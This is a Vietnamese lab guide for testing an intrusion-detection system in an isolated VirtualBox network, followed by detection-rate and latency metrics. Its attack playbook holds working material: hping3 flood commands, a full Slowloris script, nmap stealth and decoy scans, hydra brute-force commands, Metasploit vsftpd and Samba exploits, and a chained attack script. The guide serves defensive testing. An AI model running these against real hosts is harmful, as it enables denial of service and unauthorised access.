# Cẩm nang Kỹ năng: Giả lập Tấn công & Đánh giá (SKILL_ATTACK_SIMULATION.md)

**Mục đích:** Hướng dẫn thiết lập môi trường mạng an toàn (Lab) và sử dụng các công cụ Kali Linux để giả lập 4 nhóm tấn công chuẩn NSL-KDD (DoS, Probe, R2L, U2R) nhằm test hệ thống IDS.

## 1. Nguyên tắc An toàn (Rules of Engagement)
- **Tuyệt đối không** chạy các lệnh tấn công (`hping3`, `hydra`, `metasploit`) trên mạng Wifi công cộng hoặc mạng thật của nhà trường/công ty.
- **Môi trường bắt buộc:** VMware hoặc VirtualBox với cấu hình mạng **Host-Only** hoặc **Internal Network**.
- Sơ đồ Lab chuẩn: 1 máy Kali Linux (Attacker), 1 máy Ubuntu Server (Victim chạy dịch vụ HTTP/FTP/SSH), và IDS của bạn được đặt ở chế độ Promiscuous để nghe lén giữa 2 máy này.

### Sơ đồ Lab Network
```
┌─────────────────────────────────────────────────────────────┐
│                    Host-Only Network                         │
│                    (192.168.56.0/24)                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐   │
│  │ Kali Linux   │    │   IDS Host   │    │Ubuntu Server │   │
│  │  (Attacker)  │    │ (Sniffer)    │    │  (Victim)    │   │
│  │              │    │              │    │              │   │
│  │ 192.168.56.10│───▶│192.168.56.1  │◀───│192.168.56.20 │   │
│  │              │    │ Promiscuous  │    │              │   │
│  │  hping3      │    │    Mode      │    │ HTTP/FTP/SSH │   │
│  │  nmap        │    │              │    │              │   │
│  │  hydra       │    │              │    │              │   │
│  │  metasploit  │    │              │    │              │   │
│  └──────────────┘    └──────────────┘    └──────────────┘   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Setup VirtualBox Network
```bash
# Tạo Host-Only Network trong VirtualBox
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0

# Cấu hình VM Network Adapter: 
# Settings → Network → Adapter 1 → Host-only Adapter → vboxnet0
```

## 2. Kịch bản Giả lập Tấn công (Attack Playbook)

### A. Tấn công DoS (Denial of Service)
Mục tiêu: Làm cạn kiệt tài nguyên mạng/server. Sinh ra hàng nghìn packets/giây.

#### SYN Flood Attack
```bash
# SYN Flood cơ bản
sudo hping3 -S --flood -p 80 192.168.56.20

# SYN Flood với spoofed IP (random)
sudo hping3 -S --flood -p 80 --rand-source 192.168.56.20

# SYN Flood với rate control (10000 pps)
sudo hping3 -S -p 80 --faster -c 100000 192.168.56.20
```

#### ICMP Flood (Ping Flood)
```bash
# ICMP Flood
sudo hping3 --icmp --flood 192.168.56.20

# Ping of Death (large ICMP packets)
sudo hping3 --icmp -d 65000 --flood 192.168.56.20
```

#### UDP Flood
```bash
# UDP Flood to DNS port
sudo hping3 --udp -p 53 --flood 192.168.56.20

# UDP Flood with random ports
sudo hping3 --udp --rand-dest --flood 192.168.56.20
```

#### Slowloris (HTTP Slow Attack) - Python Script
```python
#!/usr/bin/env python3
# slowloris.py - Chỉ dùng trong môi trường Lab!

import socket
import random
import time

TARGET = "192.168.56.20"
PORT = 80
SOCKETS_COUNT = 500

sockets = []

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET, PORT))
    s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
    s.send(f"Host: {TARGET}\r\n".encode())
    s.send("User-Agent: Mozilla/5.0\r\n".encode())
    s.send("Accept-language: en-US\r\n".encode())
    return s

print(f"[*] Creating {SOCKETS_COUNT} sockets...")
for _ in range(SOCKETS_COUNT):
    try:
        sockets.append(create_socket())
    except:
        pass

print(f"[*] Sending keep-alive headers...")
while True:
    for s in list(sockets):
        try:
            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
        except:
            sockets.remove(s)
            try:
                sockets.append(create_socket())
            except:
                pass
    time.sleep(15)
```

### B. Tấn công Probe (Thăm dò / Quét mạng)
Mục tiêu: Tìm kiếm cổng mở và lỗ hổng. Sinh ra các kết nối ngắn, liên tục đổi port.

#### Port Scanning với Nmap
```bash
# SYN Scan (Stealth) - Phổ biến nhất
sudo nmap -sS -p 1-65535 -T4 192.168.56.20

# TCP Connect Scan
nmap -sT -p 1-1000 192.168.56.20

# UDP Scan
sudo nmap -sU -p 1-1000 192.168.56.20

# Aggressive Scan (OS detection, version, scripts)
sudo nmap -A 192.168.56.20

# Scan toàn bộ subnet
sudo nmap -sS -p 22,80,443 192.168.56.0/24

# Decoy scan (trộn IP giả)
sudo nmap -sS -D 192.168.56.5,192.168.56.6,192.168.56.7 192.168.56.20
```

#### Service và Version Detection
```bash
# Detect service versions
nmap -sV -p 21,22,80,443 192.168.56.20

# OS fingerprinting
sudo nmap -O 192.168.56.20

# Script scanning (vuln detection)
nmap --script vuln 192.168.56.20
```

### C. Tấn công R2L (Remote to Local)
Mục tiêu: Đoán mật khẩu để truy cập trái phép. Sinh ra các gói tin có payload chứa từ khóa đăng nhập thất bại.

#### SSH Brute Force
```bash
# Hydra SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20 -t 4

# Với username list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.20

# Verbose mode
hydra -l admin -P passwords.txt ssh://192.168.56.20 -vV
```

#### FTP Brute Force
```bash
# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.20

# Anonymous FTP check
nmap --script ftp-anon 192.168.56.20
```

#### HTTP Basic Auth Brute Force
```bash
# HTTP GET auth
hydra -l admin -P passwords.txt 192.168.56.20 http-get /admin

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.56.20 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
```

#### Custom Wordlist Generation
```bash
# Generate wordlist với crunch
crunch 6 8 abc123 -o custom_wordlist.txt

# Generate từ website content
cewl http://192.168.56.20 -w site_words.txt
```

### D. Tấn công U2R (User to Root)
Mục tiêu: Khai thác lỗ hổng tràn bộ đệm (Buffer Overflow) hoặc leo thang đặc quyền.

#### Metasploit Framework
```bash
# Start Metasploit
msfconsole

# Tìm exploit cho vsftpd
msf6> search vsftpd
msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set RHOSTS 192.168.56.20
msf6> set RPORT 21
msf6> exploit

# Tìm exploit cho Samba
msf6> search samba
msf6> use exploit/multi/samba/usermap_script
msf6> set RHOSTS 192.168.56.20
msf6> exploit
```

#### Setup Vulnerable Services (trên Victim VM)
```bash
# Cài đặt Metasploitable services (Ubuntu)
# Hoặc dùng trực tiếp Metasploitable 2 VM

# Cài vsftpd 2.3.4 (vulnerable version)
wget https://security.appspot.com/downloads/vsftpd-2.3.4.tar.gz
tar xzf vsftpd-2.3.4.tar.gz
cd vsftpd-2.3.4
make && sudo make install
```

## 3. Attack Automation Scripts

### Master Attack Script
```bash
#!/bin/bash
# attack_suite.sh - Chạy chuỗi tấn công để test IDS

TARGET="192.168.56.20"
DURATION=30  # seconds per attack

echo "=== IDS Testing Suite ==="
echo "Target: $TARGET"
echo "Duration per attack: ${DURATION}s"
echo ""

# Function to run attack with timeout
run_attack() {
    local name="$1"
    local cmd="$2"
    echo "[$(date +%H:%M:%S)] Starting: $name"
    timeout $DURATION bash -c "$cmd" &
    sleep $DURATION
    echo "[$(date +%H:%M:%S)] Completed: $name"
    sleep 5  # Cool down between attacks
}

echo "=== Phase 1: DoS Attacks ==="
run_attack "SYN Flood" "hping3 -S --flood -p 80 $TARGET"
run_attack "ICMP Flood" "hping3 --icmp --flood $TARGET"

echo "=== Phase 2: Probe Attacks ==="
run_attack "Port Scan" "nmap -sS -p 1-10000 -T4 $TARGET"
run_attack "Service Scan" "nmap -sV -p 21,22,80,443 $TARGET"

echo "=== Phase 3: R2L Attacks ==="
run_attack "SSH Brute" "hydra -l root -P /usr/share/wordlists/fasttrack.txt ssh://$TARGET -t 4"
run_attack "FTP Brute" "hydra -l admin -P /usr/share/wordlists/fasttrack.txt ftp://$TARGET"

echo "=== Testing Complete ==="
echo "Check IDS Dashboard for results"
```

## 4. Đo lường và Đánh giá (Metrics)

Khi viết báo cáo (Giai đoạn 5), cần thu thập đủ 3 chỉ số sau trong quá trình test:

### Detection Rate (Tỷ lệ phát hiện)
```
Detection Rate = (True Positives / (True Positives + False Negatives)) × 100
```
**Mục tiêu: > 95%**

### False Positive Rate (Tỷ lệ báo động giả)
```
FPR = (False Positives / (False Positives + True Negatives)) × 100
```
**Mục tiêu: < 5%**

### Response Time (Độ trễ cảnh báo)
Đo thời gian từ lúc gõ lệnh tấn công đến lúc Dashboard React hiện màu đỏ.
**Yêu cầu: < 500ms**

### Script đo Response Time
```python
#!/usr/bin/env python3
# measure_response_time.py

import subprocess
import time
import requests
import statistics

BACKEND_URL = "http://localhost:3000"
TARGET = "192.168.56.20"

def measure_detection_latency():
    results = []
    
    for i in range(10):
        # Get current alert count
        before = requests.get(f"{BACKEND_URL}/api/stats").json()
        initial_alerts = before['totalAlerts']
        
        # Start attack
        start_time = time.perf_counter()
        attack_proc = subprocess.Popen(
            ['hping3', '-S', '-p', '80', '-c', '100', TARGET],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Poll for new alert
        detected = False
        while time.perf_counter() - start_time < 5:  # 5s timeout
            stats = requests.get(f"{BACKEND_URL}/api/stats").json()
            if stats['totalAlerts'] > initial_alerts:
                detection_time = time.perf_counter() - start_time
                results.append(detection_time * 1000)  # Convert to ms
                detected = True
                break
            time.sleep(0.01)
        
        attack_proc.terminate()
        
        if not detected:
            print(f"Test {i+1}: TIMEOUT - No detection")
        else:
            print(f"Test {i+1}: {results[-1]:.2f}ms")
        
        time.sleep(2)  # Cool down
    
    if results:
        print(f"\n=== Results ===")
        print(f"Min: {min(results):.2f}ms")
        print(f"Max: {max(results):.2f}ms")
        print(f"Avg: {statistics.mean(results):.2f}ms")
        print(f"P95: {sorted(results)[int(len(results)*0.95)]:.2f}ms")

if __name__ == "__main__":
    measure_detection_latency()
```

### Confusion Matrix Template
```
                    Predicted
                 Normal | Attack
Actual  Normal |  TN   |   FP   |
        Attack |  FN   |   TP   |
```

### Evaluation Report Table
| Attack Type | Total Attacks | Detected | Missed | Detection Rate |
|-------------|---------------|----------|--------|----------------|
| DoS         |               |          |        |        %       |
| Probe       |               |          |        |        %       |
| R2L         |               |          |        |        %       |
| U2R         |               |          |        |        %       |
| **Overall** |               |          |        |        %       |

## 5. Checklist trước khi Test

```markdown
### Pre-Test Checklist
- [ ] VMs đều trong Host-Only network
- [ ] Không có kết nối Internet từ Lab network
- [ ] IDS system đang chạy và connected
- [ ] Dashboard hiển thị stats bình thường
- [ ] Victim services (HTTP/FTP/SSH) đang chạy
- [ ] Kali tools đã cài đặt (hping3, nmap, hydra)
- [ ] Screen recording software ready
- [ ] Spreadsheet để ghi kết quả
```